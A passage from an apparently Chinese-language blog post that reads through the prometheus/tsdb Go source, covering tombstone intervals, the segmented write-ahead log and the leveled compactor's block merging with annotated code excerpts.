Maxt <span class="keyword">int64</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(tr Interval)</span> <span class="title">inBounds</span><span class="params">(t <span class="keyword">int64</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> t &gt;= tr.Mint &amp;&amp; t &lt;= tr.Maxt</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(tr Interval)</span> <span class="title">isSubrange</span><span class="params">(dranges Intervals)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> _, r := <span class="keyword">range</span> dranges &#123;</span><br><span class="line">        <span class="keyword">if</span> r.inBounds(tr.Mint) &amp;&amp; r.inBounds(tr.Maxt) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="TombstoneReader"><a href="#TombstoneReader" class="headerlink" title="TombstoneReader"></a>TombstoneReader</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// TombstoneReader gives access to tombstone intervals by series reference.</span></span><br><span class="line"><span class="keyword">type</span> TombstoneReader <span class="keyword">interface</span> &#123;</span><br><span class="line">    <span class="comment">// Get returns deletion intervals for the series with the given reference.</span></span><br><span class="line">    Get(ref <span class="keyword">uint64</span>) (Intervals, error)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Iter calls the given function for each encountered interval.</span></span><br><span class="line">    Iter(<span class="function"><span class="keyword">func</span><span class="params">(<span class="keyword">uint64</span>, Intervals)</span> <span class="title">error</span>) <span class="title">error</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Close any underlying resources</span></span><br><span class="line">    Close() error</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>提供了一个内存版的实现</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> memTombstones <span class="keyword">map</span>[<span class="keyword">uint64</span>]Intervals</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> emptyTombstoneReader = memTombstones&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// EmptyTombstoneReader returns a TombstoneReader that is always empty.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">EmptyTombstoneReader</span><span class="params">()</span> <span class="title">TombstoneReader</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> emptyTombstoneReader</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t memTombstones)</span> <span class="title">Get</span><span class="params">(ref <span class="keyword">uint64</span>)</span> <span class="params">(Intervals, error)</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> t[ref], <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t memTombstones)</span> <span class="title">Iter</span><span class="params">(f <span class="keyword">func</span>(<span class="keyword">uint64</span>, Intervals)</span> <span class="title">error</span>) <span class="title">error</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> ref, ivs := <span class="keyword">range</span> t &#123;</span><br><span class="line">        <span class="keyword">if</span> err := f(ref, ivs); err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> err</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t memTombstones)</span> <span class="title">add</span><span class="params">(ref <span class="keyword">uint64</span>, itv Interval)</span></span> &#123;</span><br><span class="line">    t[ref] = t[ref].add(itv)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(memTombstones)</span> <span class="title">Close</span><span class="params">()</span> <span class="title">error</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>TombstoneReader 的内容可以被写入文件, 也可以通过文件读出.</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">writeTombstoneFile</span><span class="params">(dir <span class="keyword">string</span>, tr TombstoneReader)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">    path := filepath.Join(dir, tombstoneFilename)</span><br><span class="line">    tmp := path + <span class="string">".tmp"</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> renameFile(tmp, path)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">readTombstones</span><span class="params">(dir <span class="keyword">string</span>)</span> <span class="params">(memTombstones, error)</span></span> &#123;</span><br><span class="line">    b, err := ioutil.ReadFile(filepath.Join(dir, tombstoneFilename))</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    stonesMap := memTombstones&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> d.<span class="built_in">len</span>() &gt; <span class="number">0</span> &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        stonesMap.add(k, Interval&#123;mint, maxt&#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> stonesMap, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="wal-go"><a href="#wal-go" class="headerlink" title="wal.go"></a>wal.go</h4><p>prometheus/tsdb 会将几类数据先写入 wal (write ahead log) 文件</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// WALEntryType indicates what data a WAL entry contains.</span></span><br><span class="line"><span class="keyword">type</span> WALEntryType <span class="keyword">uint8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Entry types in a segment file.</span></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">    WALEntrySymbols WALEntryType = <span class="number">1</span></span><br><span class="line">    WALEntrySeries  WALEntryType = <span class="number">2</span></span><br><span class="line">    WALEntrySamples WALEntryType = <span class="number">3</span></span><br><span class="line">    WALEntryDeletes WALEntryType = <span class="number">4</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// WAL is a write ahead log that can log new series labels and samples.</span></span><br><span class="line"><span class="comment">// It must be completely read before new entries are logged.</span></span><br><span class="line"><span class="keyword">type</span> WAL <span class="keyword">interface</span> &#123;</span><br><span class="line">    Reader() WALReader</span><br><span class="line">    LogSeries([]RefSeries) error</span><br><span class="line">    LogSamples([]RefSample) error</span><br><span class="line">    LogDeletes([]Stone) error</span><br><span class="line">    Truncate(mint <span class="keyword">int64</span>, keep <span class="function"><span class="keyword">func</span><span class="params">(<span class="keyword">uint64</span>)</span> <span class="title">bool</span>) <span class="title">error</span></span></span><br><span class="line">    Close() error</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// WALReader reads entries from a WAL.</span></span><br><span class="line"><span class="keyword">type</span> WALReader <span class="keyword">interface</span> &#123;</span><br><span class="line">    Read(</span><br><span class="line">        seriesf <span class="function"><span class="keyword">func</span><span class="params">([]RefSeries)</span>,</span></span><br><span class="line">        samplesf <span class="function"><span class="keyword">func</span><span class="params">([]RefSample)</span>,</span></span><br><span class="line">        deletesf <span class="function"><span class="keyword">func</span><span class="params">([]Stone)</span>,</span></span><br><span class="line">    ) error</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>与之相关的数据结构定义如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// RefSeries is the series labels with the series ID.</span></span><br><span class="line"><span class="keyword">type</span> RefSeries <span class="keyword">struct</span> &#123;</span><br><span class="line">    Ref    <span class="keyword">uint64</span></span><br><span class="line">    Labels labels.Labels</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// RefSample is a timestamp/value pair associated with a reference to a series.</span></span><br><span class="line"><span class="keyword">type</span> RefSample <span class="keyword">struct</span> &#123;</span><br><span class="line">    Ref <span class="keyword">uint64</span></span><br><span class="line">    T   <span class="keyword">int64</span></span><br><span class="line">    V   <span class="keyword">float64</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 基于内存的 series 数据, 在后续的阅读中再仔细分析</span></span><br><span class="line">    series *memSeries</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="SegmentWAL"><a href="#SegmentWAL" class="headerlink" title="SegmentWAL"></a>SegmentWAL</h5><p>这是 WAL 的一个实现, 会将数据切成 256MB 一片进行存储, 切片的组织方式与 chunks 类似.</p><p>相应的, 操作文件的相关实现代码也很相似.</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// segmentFile wraps a file object of a segment and tracks the highest timestamp</span></span><br><span class="line"><span class="comment">// it contains. During WAL truncating, all segments with no higher timestamp than</span></span><br><span class="line"><span class="comment">// the truncation threshold can be compacted.</span></span><br><span class="line"><span class="keyword">type</span> segmentFile <span class="keyword">struct</span> &#123;</span><br><span class="line">    *os.File</span><br><span class="line">    maxTime   <span class="keyword">int64</span>  <span class="comment">// highest tombstone or sample timpstamp in segment</span></span><br><span class="line">    minSeries <span class="keyword">uint64</span> <span class="comment">// lowerst series ID in segment</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// SegmentWAL is a write ahead log for series data.</span></span><br><span class="line"><span class="keyword">type</span> SegmentWAL <span class="keyword">struct</span> &#123;</span><br><span class="line">    mtx     sync.Mutex</span><br><span class="line">    metrics *walMetrics</span><br><span class="line"></span><br><span class="line">    dirFile *os.File</span><br><span class="line">    files   []*segmentFile</span><br><span class="line"></span><br><span class="line">    logger        log.Logger</span><br><span class="line">    flushInterval time.Duration</span><br><span class="line">    segmentSize   <span class="keyword">int64</span></span><br><span class="line"></span><br><span class="line">    crc32 hash.Hash32</span><br><span class="line">    cur   *bufio.Writer</span><br><span class="line">    curN  <span class="keyword">int64</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 信号</span></span><br><span class="line">    stopc   <span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line">    donec   <span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 后台执行的操作</span></span><br><span class="line">    actorc  <span class="keyword">chan</span> <span class="function"><span class="keyword">func</span><span class="params">()</span> <span class="title">error</span> // <span class="title">sequentialized</span> <span class="title">background</span> <span class="title">operations</span></span></span><br><span class="line">    </span><br><span class="line">    buffers sync.Pool</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="LogXXXX"><a href="#LogXXXX" class="headerlink" title="LogXXXX"></a>LogXXXX</h6><p>LogSeries, LogSamples, LogDeletes 对各自的操作数据分别编码写入 WAL.</p><h6 id="Truncate"><a href="#Truncate" class="headerlink" title="Truncate"></a>Truncate</h6><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Truncate deletes the values prior to mint and the series which the keep function</span></span><br><span class="line"><span class="comment">// does not indiciate to preserve.</span></span><br><span class="line"><span class="comment">// 用于清除不再需要的数据</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(w *SegmentWAL)</span> <span class="title">Truncate</span><span class="params">(mint <span class="keyword">int64</span>, keep <span class="keyword">func</span>(<span class="keyword">uint64</span>)</span> <span class="title">bool</span>) <span class="title">error</span></span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="run"><a href="#run" class="headerlink" title="run"></a>run</h6><p>通过 <code>OpenSegmentWAL</code> 打开一个 SegmentWAL 的时候, 会在一个独立的 goroutine 中运行 run 函数, 用来处理 <code>actorc</code> 传递的后台操作.</p><p>目前 <code>actorc</code> 传递的操作仅有文件的分片</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// cut finishes the currently active segments and opens the next one.</span></span><br><span class="line"><span class="comment">// The encoder is reset to point to the new segment.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(w *SegmentWAL)</span> <span class="title">cut</span><span class="params">()</span> <span class="title">error</span></span> &#123;</span><br><span class="line">    <span class="comment">// Sync current head to disk and close.</span></span><br><span class="line">    <span class="keyword">if</span> hf := w.head(); hf != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> err := w.flush(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> err</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Finish last segment asynchronously to not block the WAL moving along</span></span><br><span class="line">        <span class="comment">// in the new segment.</span></span><br><span class="line">        <span class="comment">// 结束当前的切片文件</span></span><br><span class="line">        <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">            w.actorc &lt;- <span class="function"><span class="keyword">func</span><span class="params">()</span> <span class="title">error</span></span> &#123;</span><br><span class="line">                off, err := hf.Seek(<span class="number">0</span>, os.SEEK_CUR)</span><br><span class="line">                <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> errors.Wrapf(err, <span class="string">"finish old segment %s"</span>, hf.Name())</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> err := hf.Truncate(off); err != <span class="literal">nil</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> errors.Wrapf(err, <span class="string">"finish old segment %s"</span>, hf.Name())</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> err := hf.Sync(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> errors.Wrapf(err, <span class="string">"finish old segment %s"</span>, hf.Name())</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> err := hf.Close(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> errors.Wrapf(err, <span class="string">"finish old segment %s"</span>, hf.Name())</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化新的切片文件供写入</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Compact-go"><a href="#Compact-go" class="headerlink" title="Compact.go"></a>Compact.go</h4><p>对底层存储的压缩相关的实现</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Compactor provides compaction against an underlying storage</span></span><br><span class="line"><span class="comment">// of time series data.</span></span><br><span class="line"><span class="keyword">type</span> Compactor <span class="keyword">interface</span> &#123;</span><br><span class="line">    <span class="comment">// Plan returns a set of non-overlapping directories that can</span></span><br><span class="line">    <span class="comment">// be compacted concurrently.</span></span><br><span class="line">    <span class="comment">// Results returned when compactions are in progress are undefined.</span></span><br><span class="line">    Plan(dir <span class="keyword">string</span>) ([]<span class="keyword">string</span>, error)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Write persists a Block into a directory.</span></span><br><span class="line">    Write(dest <span class="keyword">string</span>, b BlockReader, mint, maxt <span class="keyword">int64</span>) (ulid.ULID, error)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Compact runs compaction against the provided directories. Must</span></span><br><span class="line">    <span class="comment">// only be called concurrently with results of Plan().</span></span><br><span class="line">    Compact(dest <span class="keyword">string</span>, dirs ...<span class="keyword">string</span>) (ulid.ULID, error)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="LeveledCompactor"><a href="#LeveledCompactor" class="headerlink" title="LeveledCompactor"></a>LeveledCompactor</h5><p>是 Compactor 的实现</p><h6 id="Plan"><a href="#Plan" class="headerlink" title="Plan"></a>Plan</h6><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Plan returns a list of compactable blocks in the provided directory.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *LeveledCompactor)</span> <span class="title">Plan</span><span class="params">(dir <span class="keyword">string</span>)</span> <span class="params">([]<span class="keyword">string</span>, error)</span></span> &#123;</span><br><span class="line">    dirs, err := blockDirs(dir)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  </span><br><span class="line">    <span class="keyword">var</span> dms []dirMeta</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _, dir := <span class="keyword">range</span> dirs &#123;</span><br><span class="line">        <span class="comment">// 读取 BlockMeta 作为判断是否可以 compact 的依据</span></span><br><span class="line">        meta, err := readMetaFile(dir)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> c.plan(dms)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="populateBlock"><a href="#populateBlock" class="headerlink" title="populateBlock"></a>populateBlock</h6><p><code>LeveledCompactor.Write</code> 和 <code>LeveledCompactor.Compact</code> 两个方法中都用到 <code>LeveledCompactor.write</code>, 而 <code>LeveledCompactor.populateBlock</code> 是 write 方法的重要逻辑.</p><p>其作用是将一组 Block 的数据合并, 再写入 IndexWriter, ChunkWriter.</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// populateBlock fills the index and chunk writers with new data gathered as the union</span></span><br><span class="line"><span class="comment">// of the provided blocks. It returns meta information for the new block.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *LeveledCompactor)</span> <span class="title">populateBlock</span><span class="params">(blocks []BlockReader, meta *BlockMeta, indexw IndexWriter, chunkw ChunkWriter)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> (</span><br><span class="line">        set        ChunkSeriesSet</span><br><span class="line">        allSymbols = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">struct</span>&#123;&#125;, <span class="number">1</span>&lt;&lt;<span class="number">16</span>)</span><br><span class="line">        closers    = []io.Closer&#123;&#125;</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123; closeAll(closers...) &#125;()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历旧 block 数据</span></span><br><span class="line">    <span class="keyword">for</span> i, b := <span class="keyword">range</span> blocks &#123;</span><br><span class="line">        indexr, err := b.Index()</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">        chunkr, err := b.Chunks()</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">        tombsr, err := b.Tombstones()</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">        symbols, err := indexr.Symbols()</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">        all, err := indexr.Postings(index.AllPostingsKey())</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> err</span><br><span class="line">        &#125;</span><br><span class="line">        all = indexr.SortedPostings(all)</span><br><span class="line"></span><br><span class="line">        s := newCompactionSeriesSet(indexr, chunkr, tombsr, all)</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">      </span><br><span class="line">        <span class="comment">// 与上一层并形成一个新的 merger</span></span><br><span class="line">        set, err = newCompactionMerger(set, s)</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> err</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// We fully rebuild the postings list index from merged series.</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历 merger</span></span><br><span class="line">    <span class="keyword">for</span> set.Next() &#123;</span><br><span class="line">        lset, chks, dranges := set.At() <span class="comment">// The chunks here are not fully deleted.</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Skip the series with all deleted chunks.</span></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> err := chunkw.WriteChunks(chks...); err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> errors.Wrap(err, <span class="string">"write chunks"</span>)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> err := indexw.AddSeries(i, lset, chks...); err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> errors.Wrap(err, <span class="string">"add series"</span>)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    s := <span class="built_in">make</span>([]<span class="keyword">string</span>, <span class="number">0</span>, <span class="number">256</span>)</span><br><span class="line">    <span class="keyword">for</span> n, v := <span class="keyword">range</span> values &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> err := indexw.WriteLabelIndex([]<span class="keyword">string</span>&#123;n&#125;, s); err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> errors.Wrap(err, <span class="string">"write label index"</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _, l := <span class="keyword">range</span> postings.SortedKeys() &#123;</span><br><span class="line">        <span class="keyword">if</span> err := indexw.WritePostings(l.Name, l.Value, postings.Get(l.Name, l.Value)); err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> errors.Wrap(err, <span class="string">"write postings"</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="block-go"><a href="#block-go" class="headerlink" title="block.go"></a>block.go</h4><h5 id="Block"><a href="#Block" class="headerlink" title="Block"></a>Block</h5><h6 id="Delete"><a href="#Delete" class="headerlink" 